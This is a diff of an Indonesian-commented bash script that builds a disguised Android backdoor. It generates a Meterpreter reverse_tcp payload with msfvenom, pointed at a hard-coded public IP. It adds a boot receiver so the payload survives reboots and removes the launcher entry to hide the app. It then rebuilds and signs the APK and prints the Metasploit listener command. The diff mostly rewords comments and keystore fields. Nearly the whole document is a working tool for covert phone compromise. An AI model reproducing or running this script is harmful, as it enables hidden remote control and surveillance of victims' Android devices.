@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Konfigurasi awal
-LHOST="8.215.192.205"   # ganti dengan IP lokal kamu
+# === KONFIGURASI ===
+LHOST="8.215.192.205"
 LPORT="4444"
 PAYLOAD_NAME="payload.apk"
 DECOMPILE_DIR="payload_dec"
@@ -11,14 +11,17 @@ ALIAS="key0"
 STOREPASS="password"
 KEYPASS="password"
 
-echo "[1] Membuat payload APK dengan msfvenom..."
+# === 1. Generate Payload APK ===
+echo "[1] Membuat payload APK..."
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$PAYLOAD_NAME"
 
+# === 2. Decompile APK ===
 echo "[2] Decompile APK..."
 apktool d "$PAYLOAD_NAME" -o "$DECOMPILE_DIR"
 
 MANIFEST="$DECOMPILE_DIR/AndroidManifest.xml"
 
+# === 3. Edit Manifest ===
 echo "[3] Edit AndroidManifest.xml..."
 # Tambah permission BOOT
 sed -i '/<\/manifest>/i \<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />' "$MANIFEST"
@@ -34,7 +37,8 @@ sed -i '/<\/application>/i \
 # Sembunyikan launcher
 sed -i '/android.intent.action.MAIN/,/category.LAUNCHER/d' "$MANIFEST"
 
-echo "[4] Tambahkan BootReceiver.smali..."
+# === 4. Tambah BootReceiver.smali ===
+echo "[4] Tambah BootReceiver.smali..."
 BOOT_RECEIVER="$DECOMPILE_DIR/smali/com/metasploit/stage/BootReceiver.smali"
 mkdir -p "$(dirname "$BOOT_RECEIVER")"
 
@@ -57,17 +61,19 @@ cat <<EOF > "$BOOT_RECEIVER"
 .end method
 EOF
 
-echo "[5] Recompile APK..."
+# === 5. Rebuild APK ===
+echo "[5] Rebuild APK..."
 apktool b "$DECOMPILE_DIR" -o "$MOD_APK"
 
-echo "[6] Buat keystore jika belum ada..."
+# === 6. Generate Keystore (jika belum ada) ===
 if [ ! -f "$KEYSTORE" ]; then
+    echo "[6] Buat keystore..."
     keytool -genkey -v -keystore "$KEYSTORE" -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 10000 <<EOF
 $STOREPASS
 $STOREPASS
-ChatGPT
-CyberTest
-TestCorp
+Backdoor Test
+Cyberlab
+MyOrg
 Jakarta
 Jawa
 ID
@@ -75,10 +81,13 @@ yes
 EOF
 fi
 
+# === 7. Sign APK ===
 echo "[7] Sign APK..."
-jarsigner -keystore "$KEYSTORE" -storepass "$STOREPASS" -keypass "$KEYPASS" "$MOD_APK" "$ALIAS"
+jarsigner -verbose -keystore "$KEYSTORE" -storepass "$STOREPASS" -keypass "$KEYPASS" "$MOD_APK" "$ALIAS"
 
-echo "[✓] APK selesai: $MOD_APK"
-
-echo "[8] Jalankan listener di Metasploit:"
-echo "    msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit'"
+# === 8. Output ===
+echo "[✓] Sukses! APK hasil: $MOD_APK"
+echo
+echo "[!] Jalankan listener di Metasploit dengan perintah ini:"
+echo
+echo "msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; exploit'"
